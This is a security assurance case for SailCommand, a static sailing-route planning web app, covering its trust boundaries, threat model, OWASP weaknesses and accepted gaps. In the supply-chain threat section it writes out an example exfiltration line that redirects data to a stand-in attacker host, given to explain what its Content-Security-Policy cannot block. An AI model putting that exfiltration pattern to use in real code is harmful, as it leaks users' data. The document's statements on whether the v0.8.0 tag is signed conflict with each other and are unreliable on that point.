# SailCommand security assurance case

**Status:** current as of 2026-08-03, describing `develop` at the time of
writing (`v0.8.0` cut). Reviewed at each release cut.
**Audience:** users deciding whether to trust the app, and reviewers assessing
the project (this document is the artifact for the OpenSSF Best Practices
`assurance_case` criterion).

This is an *argument*, not a policy. It states what security properties
SailCommand claims, describes the system and its trust boundaries, models the
threats, argues that secure-design principles have been applied, walks the
common implementation weaknesses, and — in [§7](#7-known-gaps-and-accepted-risk)
— lists what is **not** covered. Where the argument is weak, it says so.

For how to report a vulnerability and what happens next, see
[`SECURITY.md`](../SECURITY.md). The security *requirements* argued here are
stated for users in
[`SECURITY.md` § Security requirements](../SECURITY.md#security-requirements--what-you-can-and-cannot-expect);
they are restated below as claims so the argument stands on its own.

## 1. Claims

| # | Claim |
|---|---|
| **C1** | There is no server-side attack surface owned by this project: no backend, no API, no database, no accounts. |
| **C2** | User data — saved plans, wind grids, settings, GPS position — never leaves the user's device, except for the two deliberate outbound cases in [§2](#2-system-description). |
| **C3** | Every untrusted input crossing into the app is validated before use, and a hostile input degrades to a clear error rather than to code execution, corruption, or a hang. |
| **C4** | The shipped bytes correspond to the reviewed source: what is on `main` is what CI builds, reproducibly, and what GitHub Pages serves. |
| **C5** | Third-party code entering the product is inventoried, monitored, and updated. |
| **C6** | Failure is safe: a missing key, a missing permission, or a dead network disables a feature rather than degrading the app's integrity — and never silently produces a wrong route. |

Explicitly **not** claimed: chart authority (SailCommand is a passage-planning
aid, not a navigation device — official charts and the vessel's plotter remain
authoritative), protection against a compromised device or browser, and
protection of the user's own AIS key beyond what their browser profile provides.

## 2. System description

SailCommand has two completely separate halves, and conflating them is the
easiest way to misread its security posture.

**Build time — `pipeline/` (never runs for a user).** Python and Node scripts
turn public source data (EMODnet bathymetry, OpenStreetMap land polygons, a
Protomaps extract, an ORC certificate) into static assets that are **committed
to the repository**: the land/depth mask, polar tables, the curated harbor list,
and the basemap archive. Users never execute this code and never contact these
sources. `verify_mask.py` must exit 0 before a rebuilt mask is committed.

**Runtime — `app/` (a static PWA).** React + MapLibre GL in the browser, with
the isochrone router in a Web Worker, persistence in IndexedDB, and a Workbox
service worker for offline use. It is served as static files from GitHub Pages.
There is no server component of any kind.

Complete runtime network egress — there is nothing else:

| # | Destination | When | What is sent | Trust in the response |
|---|---|---|---|---|
| N1 | Same origin (`docgerd.github.io`, GitHub Pages CDN) | App load, map use | Nothing but the request | Data-only assets; the app shell is precached |
| N2 | `https://api.open-meteo.com/v1/forecast` | Only when the user plans a route | A **fixed** 11 × 17 point grid covering the whole supported area, no API key, no cookies | Untrusted JSON, validated on arrival |
| N3 | `wss://stream.aisstream.io/v0/stream` | Only if the user pasted their own AIS key | The user's key plus bounding boxes derived from the map view / active route | Untrusted JSON frames, validated per field |

Two properties of N2 are load-bearing and easy to lose in a refactor: the wind
request is **position-independent** (a constant grid, identical for every user,
so it discloses nothing about where the user is or intends to sail), and the
service worker is scoped so it can **never** cache the Open-Meteo origin — wind
lives per plan in IndexedDB so a saved route always renders against the forecast
it was computed from.

Local state: IndexedDB database `sailcommand` (object store `plans` including
each plan's wind grid; object store `settings` holding the single user settings
record, which is where a pasted AIS key lives) and a small amount of
`localStorage` (session snapshot, UI toggles) behind wrappers that tolerate
private-mode failures. There are no cookies and no analytics, telemetry, or
tracking of any kind.

## 3. Trust boundaries

| # | Boundary | Direction and content | Controls |
|---|---|---|---|
| **TB1** | Browser sandbox ↔ app | The app is ordinary web content; it holds no elevated privilege | Browser origin model; app requests only geolocation, and only when the user opens the Live view |
| **TB2** | App ↔ user-supplied GPX file | Inbound: arbitrary attacker-controlled XML the user chose to open | Size cap, element-count cap, XML-only parse, allowlist coordinate validation ([§5.1](#51-input-validation-tb2-tb3-tb4)) |
| **TB3** | App ↔ Open-Meteo (N2) | Outbound: fixed grid. Inbound: untrusted JSON | HTTPS; shape/length validation before any value is used |
| **TB4** | App ↔ aisstream.io (N3) | Outbound: user's key + bounding boxes. Inbound: untrusted JSON frames | WSS; per-field type validation; feature entirely inert without a key |
| **TB5** | App ↔ browser storage | Read/write of plans and settings | Same-origin storage; no cross-origin access; corrupt records isolated per row |
| **TB6** | Build-time pipeline ↔ committed assets | Pipeline output becomes data the app trusts | Assets are committed and reviewed in pull requests; `verify_mask.py` gate; pipeline never runs at app runtime |
| **TB7** | Source repository ↔ shipped bytes | CI builds and deploys what is on the branch | Protected branches, required checks, reproducible-build proof, SHA-pinned actions ([§5.4](#54-build-and-delivery-integrity-tb7-tb8)) |
| **TB8** | GitHub Pages CDN ↔ client | The CDN serves the deployed artifact over TLS | Browser TLS verification; post-deploy smoke probe; **the CDN is trusted** — see [§7](#7-known-gaps-and-accepted-risk) |
| **TB9** | Third-party dependencies ↔ product | npm/pip packages become part of the shipped bundle | Lockfiles, Dependabot across five ecosystems, CodeQL, license inventory with a CI drift guard |

The single most important structural fact: **there is no trust boundary between
a user and a server we operate, because there is no such server.** The whole
class of threats around authentication, session handling, multi-tenant data
leakage, server-side injection, and breach of a central data store is absent by
construction rather than defended.

## 4. Threat model

Adversaries considered, in rough order of realism for a static client-only PWA.

### T1 — Supply-chain compromise of a bundled dependency

*The most realistic serious threat.* A malicious npm package version reaches the
bundle and runs with full app privileges: it could read IndexedDB (plans, AIS
key) and exfiltrate to any origin.

**Countered by:** exact lockfiles, weekly grouped Dependabot updates across five
ecosystems plus Dependabot security updates, CodeQL on every push and pull
request, GitHub secret scanning with push protection, a committed third-party
notices inventory whose drift fails CI, and human review of every dependency
bump (nothing merges automatically).
**Residual risk: reduced, not eliminated.** A `<meta http-equiv>`
Content-Security-Policy ([#223](https://github.com/DocGerd/sail_command/issues/223))
now restricts `connect-src` to `'self'`, Open-Meteo, and aisstream.io — a
compromised bundle cannot make **background requests** (fetch/XHR/WebSocket/
`sendBeacon`) to an arbitrary origin. `connect-src` governs only that traffic
class; it does not restrict top-level navigation (`location.href =
'https://evil.example/?d=' + data` — CSP3's `navigate-to` directive was never
shipped in browsers), `window.open`, `<link rel="dns-prefetch"/"preconnect">`,
or WebRTC (no `webrtc` directive is set, and WebRTC does **not** fall back to
`default-src`) — all remain viable, if noisier, exfiltration channels, and
exfiltration to the three already-allowed destinations (e.g. abusing the
Open-Meteo connection as a covert channel) is also unrestricted. Dependency
review is still one person reading a diff. Partially bounded by the app
holding little worth stealing: no credentials except an optional AIS key the
user supplies and can revoke.

### T2 — Hostile GPX import

A crafted `.gpx` file (XXE, billion-laughs, enormous documents, poisoned
coordinates) opened by a user who trusted its source.

**Countered by:** parsing exclusively through the browser `DOMParser` with
`application/xml`, which does not resolve external entities (XXE-safe by
construction — do not hand-roll entity handling); a 10 MiB file-size cap before
parsing; a 100 000-element cap checked *before* any O(n) traversal, so an
oversized hostile document is rejected before the expensive work; and full
allowlist validation of every coordinate (`Number` rather than `parseFloat`, so
`"54.8abc"` is rejected rather than silently accepted; WGS84 range check;
supported-data-area bounds check; minimum point count; via-points capped at 8).
Failures throw a typed error mapped to user-facing copy — never a silent skip.
Parsed values become numbers used for routing; nothing from the file is rendered
as markup or persisted.
**Residual risk: low.**

### T3 — Hostile or compromised Open-Meteo response

A malicious response (or a MITM that defeats TLS) returning malformed or absurd
wind data.

**Countered by:** HTTPS with default certificate verification; strict response
validation — the payload must be an array of exactly the expected point count,
point 0 must carry a non-empty `hourly.time`, and each point's arrays are
checked before being read into the typed grid; anything else raises a typed
`malformed` error surfaced to the user. A bad response yields "cannot plan",
never a corrupt plan.
**Residual risk:** *plausible-but-wrong* wind values would pass validation and
produce a wrong route. This is a data-quality risk, not a memory-safety or
code-execution one, and it is the main reason the app is documented as a
planning aid whose output must be checked against official sources.

### T4 — Hostile aisstream.io frames

Malformed or malicious WebSocket frames on the optional AIS overlay.

**Countered by:** the whole feature is inert without a user-supplied key — no
key means no client and zero sockets (an invariant the network-free e2e suite
depends on); frames are `JSON.parse`d inside a try/catch and then validated
field by field (`typeof`, `Number.isFinite`), with unrecognized frames dropped;
vessel data only ever becomes map geometry and text nodes.
**Residual risk: low.** Note the privacy trade-off, which is a deliberate design
consequence rather than a defect: when the user enables AIS, their key and
bounding boxes covering their area of interest are sent to a third party. This
is stated in the user-facing security requirements.

### T5 — Tampering between the repository and the user's browser

An attacker modifying the deployed artifact, or the CDN serving something other
than what was built.

**Countered by:** deployment only from protected branches through GitHub's OIDC
Pages flow, with no long-lived deploy credentials; all GitHub Actions pinned to
full commit SHAs; a CI determinism proof that double-builds production and fails
on any byte difference; a per-file sha256 manifest with a cross-run byte-drift
gate; and a post-deploy smoke probe that verifies the served basemap archive.
**Residual risk: real and acknowledged, though narrower from `v0.8.0`.**
Release tags from `v0.8.0` onward are cryptographically signed
([#322](https://github.com/DocGerd/sail_command/issues/322)) — the mechanism
and a registered public key are live today, proven end to end against
throwaway tags — so once the first `v0.8.0` tag itself ships, a user WILL be
able to independently verify that it corresponds to a commit the maintainer
actually authored. That does not close the gap fully: signing covers the
tagged *commit*, not the *deployed artifact bytes* GitHub Pages serves —
GitHub Pages is still trusted to serve exactly what CI built from that
commit, and a user has no independent way to check the bytes their browser
received against the signature. `v0.1.0` through `v0.7.0` remain unsigned
permanently (not retroactive). See [§7](#7-known-gaps-and-accepted-risk).

### T6 — Local attacker with access to the device

Someone with the unlocked device, or another app able to read the browser
profile.

**Countered by:** the browser's origin isolation, and by there being no account
to hijack. Nothing else — and nothing else is claimed.
**Residual risk: accepted and documented.** Plans, position history, and any AIS
key are readable by anyone who can read the browser profile. The AIS key is
stored as entered; encrypting it locally would be theatre, since the key needed
for the decryption would sit next to it in the same storage. Users are told to
treat the key as being only as safe as their browser profile, and it is
revocable at aisstream.io.

### T7 — Malicious contributor or compromised maintainer account

Hostile code introduced through a pull request, or the maintainer's account
taken over.

**Countered by:** pull-request-only merges with required `app` + `e2e` checks
under a strict up-to-date policy, mandatory review-thread resolution, no force
pushes and no branch deletion on `main` or `develop`, CodeQL on every pull
request, a per-PR review pass, and a human walkthrough of the built app before
any release reaches production.
**Residual risk: structural.** With one maintainer there is no second-human
approval — GitHub does not count self-approval, so requiring it would deadlock
every merge. The disposition is documented deliberately in
[`SECURITY.md`](../SECURITY.md#openssf-scorecard-posture-branch-protection-code-review),
and a takeover of the single maintainer account is not defended against beyond
GitHub's own account security. See also
[`GOVERNANCE.md`](../GOVERNANCE.md#continuity-and-succession).

### Threats deliberately out of model

Nation-state adversaries; physical attacks on the vessel; denial of service
against Open-Meteo, aisstream.io, or GitHub Pages (third-party availability the
project does not control — and by design the app keeps working offline when they
are down); and the correctness of the upstream bathymetry and wind data, which
is a data-quality question handled by the "planning aid, not navigation device"
framing rather than by a security control.

## 5. Secure-design argument

The claim is not that security was retrofitted, but that the architecture makes
most of these problems absent rather than mitigated.

### 5.1 Input validation (TB2, TB3, TB4)

Complete mediation on every untrusted input, with **allowlist** rules (accept
what is known-good) rather than blocklists, and caps applied *before* expensive
work:

- GPX import — `app/src/lib/gpx.ts` plus the file-size cap in the import
  handler; detailed in [T2](#t2--hostile-gpx-import).
- Wind responses — `app/src/services/openMeteo.ts`; detailed in
  [T3](#t3--hostile-or-compromised-open-meteo-response).
- AIS frames — `app/src/services/aisStream.ts`; detailed in
  [T4](#t4--hostile-aisstreamio-frames).
- User-entered numbers — clamped at the input primitive
  (`NumberInput.tsx`), so out-of-range settings cannot reach the solver.

Validation failures are typed errors mapped to user-facing messages. The project
treats a silent skip as a defect, which is why the GPX parser validates *every*
point before applying the via-point cap: a malformed coordinate on a point that
would have been dropped still errors honestly.

### 5.2 Fail-safe defaults (C6)

- The AIS overlay is **off** and socket-free without a key. There is no default
  key and no eager connect; a key is never committed anywhere.
- Missing geolocation permission disables Live-view guidance; it does not fall
  back to a guessed position.
- No network means saved plans, the map, and Live guidance keep working; only
  planning a *new* route requires connectivity, and that failure is reported
  explicitly.
- A depth or wind failure produces "cannot plan", never a route computed from
  substituted data.

### 5.3 Economy of mechanism and least privilege

- **No backend, no accounts, no sessions, no cookies, no server-side state.**
  Whole vulnerability classes have nowhere to occur.
- The app requests exactly one browser permission (geolocation), only when the
  Live view is used.
- Workflow permissions are minimal and explicit (`contents: read` by default,
  with narrow additions for SARIF upload and the Pages OIDC flow); no long-lived
  deploy secrets exist.
- The service worker's routes are narrowly scoped: the basemap Range route and a
  same-origin glyph route, so the SW can never cache a third-party origin.
- No HTML sink is used anywhere in the app: no `innerHTML`, no
  `dangerouslySetInnerHTML`, no `eval`, no `new Function`. React escapes text by
  default and dynamic map chrome is built through DOM APIs.

### 5.4 Build and delivery integrity (TB7, TB8)

`develop` (the default branch) and `main` are both protected by one ruleset:
pull-request-only merges (merge commits only), required `app` + `e2e` checks
under a strict up-to-date policy, mandatory review-thread resolution, no force
pushes, no deletions. CI runs lint → typecheck → tests → build, plus a
third-party notices drift guard. `pipeline/`'s Python is separately linted and
formatted with ruff in `.github/workflows/python-lint.yml` (job `ruff`) — an
optional check, not part of `protect-main`'s required `app` + `e2e` set.
Production is built from `main` only and double-built as a determinism proof;
a byte difference fails the run. Every GitHub Action is pinned to a full
commit SHA.

### 5.5 Defense in depth where it is cheap

Type-level invariants carry a real share of the load: TypeScript `strict` with
`exactOptionalPropertyTypes`, a discriminated `Leg` union that makes an invalid
leg unrepresentable rather than merely unlikely, and CI running lint and
typecheck *before* tests so a type error fails fast. Layered caps (file size
*and* element count on GPX) are used where one bound could be bypassed.

## 6. Common implementation weaknesses

Walked against the OWASP Top 10 (2021), with the CWE Top 25 entries that are
material for a client-only PWA. "N/A by architecture" means the weakness has no
place to occur, not that it was judged unlikely.

| Weakness | Status | Argument |
|---|---|---|
| **A01 Broken access control** | N/A by architecture | No accounts, roles, sessions, or server-side resources. All data is single-user and local, isolated by the browser origin model |
| **A02 Cryptographic failures** | Countered | The project implements no cryptography. All transport is TLS (HTTPS to Open-Meteo and Pages, WSS to aisstream.io) with default certificate verification and no bypass anywhere in the code. No cleartext protocol is supported. The only credential is the user's own AIS key — never committed, replaceable at runtime with no rebuild |
| **A03 Injection** (CWE-79 XSS, CWE-89 SQLi, CWE-611 XXE) | Countered | No SQL and no server-side interpreter. XSS: no `innerHTML` / `dangerouslySetInnerHTML` / `eval` / `new Function` anywhere; React escapes by default. XXE: `DOMParser` with `application/xml` does not resolve external entities. CodeQL's `js/xss-through-dom` alert on that parse is a **documented false positive** — its DOM-XSS sink model is mime-insensitive, while an `application/xml` parse is inert and the parser extracts only numeric coordinates and enumerated notices |
| **A04 Insecure design** | Countered | This document is the design argument; see [§5](#5-secure-design-argument). Threats were considered against the architecture, and the largest control is architectural: no backend, no accounts, no central data |
| **A05 Security misconfiguration** | Countered | Minimal workflow permissions, SHA-pinned actions, protected branches, secret scanning with push protection, no debug endpoints, static hosting. GitHub Pages cannot set response headers, so the app injects a `<meta http-equiv="Content-Security-Policy">` at build time (`cspMeta()` in `app/vite.config.ts`) with `default-src 'self'`, a `connect-src` allowlist of `'self'` plus Open-Meteo and aisstream.io, `worker-src 'self'` (no `blob:` — it would defeat `script-src 'self'`), `img-src` widened to `data:`/`blob:` where maplibre-gl 6 demonstrably needs it, and no `'unsafe-inline'`/`'unsafe-eval'`, plus the static `<meta name="referrer" content="strict-origin-when-cross-origin">` already present in `app/index.html` ([#223](https://github.com/DocGerd/sail_command/issues/223)). The meta form cannot express `frame-ancestors` or `report-uri` — accepted, static host with no framing threat model and no collector |
| **A06 Vulnerable and outdated components** (CWE-1104) | Countered | Lockfiles for every ecosystem; Dependabot across five ecosystems weekly plus security updates; zero open Dependabot alerts at the time of writing; a committed third-party notices inventory whose drift fails CI; no vendored or forked convenience copies |
| **A07 Identification and authentication failures** | N/A by architecture | There is no authentication. No accounts, no passwords, no sessions, no password reset, nothing to brute-force |
| **A08 Software and data integrity failures** (CWE-502) | **Partially countered** | Reproducible double-build with byte-drift gating, SHA-pinned actions, protected branches, post-deploy smoke probe, and — from `v0.8.0` — SSH-signed release tags verifiable via `git tag -v` ([#322](https://github.com/DocGerd/sail_command/issues/322)); the signing key is registered and the `git tag -v` verification path is proven end to end for every signed tag including `v0.8.0`, so a user willing to run that command can confirm a tag traces to the maintainer. GitHub's Verified badge — the no-local-config channel — is a documented exception for the `v0.8.0` tag itself (signed under an email not registered on the maintainer's GitHub account; see `v0.8.1`'s CHANGELOG entry) and applies from `v0.8.1` onward. No untrusted deserialization: IndexedDB uses structured clone of the app's own records, and a corrupt record is isolated to its own row rather than blanking the list. **Still partial**: signing covers the tagged commit's authorship, not the deployed artifact bytes GitHub Pages serves, and `v0.1.0`–`v0.7.0` remain permanently unsigned |
| **A09 Logging and monitoring failures** | Accepted, documented | There is deliberately no telemetry — a privacy choice that means client-side attacks cannot be observed centrally. Repository-side monitoring exists (CodeQL, Dependabot, Scorecard, deploy smoke probe). For a client-only app with no user data on any server, the privacy benefit is judged to outweigh the lost visibility |
| **A10 Server-side request forgery** | N/A by architecture | No server. The two outbound endpoints are compile-time constants; no user input ever forms a request URL |
| CWE-20 Improper input validation | Countered | See [§5.1](#51-input-validation-tb2-tb3-tb4) |
| CWE-400 / CWE-1333 Resource exhaustion, ReDoS | Countered | GPX size and element-count caps applied before traversal; via-point cap; the solver runs in a Web Worker so a long solve cannot freeze the UI thread; no user-supplied input is compiled into a regular expression |
| CWE-352 CSRF | N/A by architecture | No cookies, no session, no state-changing server endpoint |
| CWE-522 Insufficiently protected credentials | Accepted, documented | The optional AIS key is stored as entered in IndexedDB. Local encryption would be theatre (the key material would live beside it); the honest control is that the key is user-supplied, revocable, and never leaves the device except to aisstream.io itself |
| CWE-798 Hard-coded credentials | Countered | No credentials in the repository; secret scanning with push protection is enabled; the AIS overlay has no default key by design |

## 7. Known gaps and accepted risk

Listing these is part of the argument's honesty, not an aside.

| Gap | Impact | Status |
|---|---|---|
| CSP meta form cannot express `frame-ancestors`/`report-uri` | No framing protection and no automated violation reporting | Accepted — [#223](https://github.com/DocGerd/sail_command/issues/223); static host, no framing threat model in play, no collector to report to |
| `connect-src` restricts background requests only — top-level navigation, `window.open`, DNS-prefetch/preconnect, and WebRTC are unrestricted | A compromised bundle can still exfiltrate via a `location.href` redirect, a popup, prefetch/preconnect hints, or a WebRTC data channel (raises the impact of [T1](#t1--supply-chain-compromise-of-a-bundled-dependency)) | Accepted — [#223](https://github.com/DocGerd/sail_command/issues/223); CSP3's `navigate-to` directive was never shipped in browsers, and WebRTC has no `default-src` fallback to restrict it with |
| Tags through `v0.7.0` are permanently unsigned; even a signed tag only covers commit authorship, not deployed artifact bytes | Downstream cannot fully verify authenticity for pre-`v0.8.0` releases, and even post-signing verification doesn't independently prove the bytes GitHub Pages serves match ([T5](#t5--tampering-between-the-repository-and-the-users-browser)) | Accepted, narrowed — [#222](https://github.com/DocGerd/sail_command/issues/222) shipped the verification docs and process (`SECURITY.md`, `CONTRIBUTING.md`); [#322](https://github.com/DocGerd/sail_command/issues/322) landed the signing mechanism and a registered public key, live from `v0.8.0`. Not "closed": no signed tag exists in this repository yet (the mechanism lands ahead of its first use, by design — see `SECURITY.md`), and even once one does, signing covers the tagged commit, never the deployed artifact bytes. Re-tagging `v0.1.0`–`v0.7.0` is explicitly out of scope (would break the `(main SHA, git-describe version)` deploy-identity scheme), so that part of the gap is permanent, not a bootstrap step |
| Statement coverage threshold is a floor, not a ratchet, and is checked only nightly | A regression can erode up to ~14 points below the measured baseline before it is reported, and — since the check runs on a nightly schedule, not per-PR — a regression can also sit unreported for up to 24h after merging | Accepted, planned — [#221](https://github.com/DocGerd/sail_command/issues/221) delivered the measurement (93.92% statements, 4100/4365, `npm --prefix app run test:coverage`, 2026-08-03), satisfying the OpenSSF `test_statement_coverage80` criterion; [#319](https://github.com/DocGerd/sail_command/issues/319)/[#342](https://github.com/DocGerd/sail_command/issues/342) added `thresholds.statements: 80` in `app/vite.config.ts` plus a non-required `.github/workflows/coverage.yml` job that runs nightly (`schedule`) and on manual `workflow_dispatch` — not per-PR or per-push, so the full v8-instrumented suite (~17 min measured locally) never adds latency to a PR. Getting there needed a centralized coverage-aware test-timeout module (`app/src/test/timeouts.ts`, imported by every solver-heavy test file) plus a structural guard (`app/src/test/timeoutGuard.test.ts`) after three earlier dispatch attempts each failed on a different timeout surface (a job-level `timeout-minutes` cap, then the solver-heavy tests' own per-test `vi.setConfig`/`timeout` budgets under v8 instrumentation — raising the job cap could never have fixed the second). `src/sw.ts` and `src/routing/worker.ts` remain IN coverage scope at ~0% BY DESIGN — jsdom has no real ServiceWorker or dedicated-Worker execution model — with their functional assurance instead coming from `app/e2e/offline.spec.ts`, `csp.spec.ts`, `basemap-fallback.spec.ts`, `plan.spec.ts`, `live.spec.ts`, and `deploy.yml`'s post-deploy CDN smoke probe; excluding them was considered and rejected (see the #319 decision comment) since together they are only ~0.57% of statements and excluding would *raise*, not preserve, the published figure. The 80% floor is deliberate, not a ceiling, and both the ~14-point corridor and the nightly (not per-PR) cadence are knowingly accepted gaps — revisit at the next release cut |
| Bus factor is 1 | No second person can review, merge, release, or respond to a report | Structural — [`GOVERNANCE.md`](../GOVERNANCE.md#continuity-and-succession) |
| GitHub Pages CDN is trusted | A CDN compromise would serve modified bytes; no subresource integrity is possible for the entry document | Accepted — inherent to static hosting |
| Local device compromise | Out of scope; see [T6](#t6--local-attacker-with-access-to-the-device) | Accepted, documented |
| Upstream data correctness | Wrong bathymetry or wind produces a wrong route | Accepted — mitigated by framing, not by a control: SailCommand is a planning aid, and official charts plus the vessel's plotter remain authoritative |

## 8. Assumptions

The argument depends on these holding. If one fails, the corresponding claims
fail with it.

1. The user's browser and device are not compromised, and the browser correctly
   implements the origin model, TLS certificate verification, and `DOMParser`'s
   refusal to resolve external entities.
2. GitHub (repository, Actions, Pages) behaves as documented and is not
   compromised.
3. Committed static assets were produced by the reviewed pipeline from the cited
   public sources — they are reviewed as data in pull requests, not
   independently re-derived at build time.
4. The user treats their own AIS key as a secret and can revoke it upstream.
5. Users heed the standing caveat that SailCommand is a passage-planning aid and
   verify against official charts.

## 9. Maintenance

This document is reviewed at every release cut, and updated whenever a change
adds a network destination, a new class of untrusted input, a new form of
persistence, or a new build/deploy path. If it disagrees with the code, the code
is right and this file is a bug worth filing.
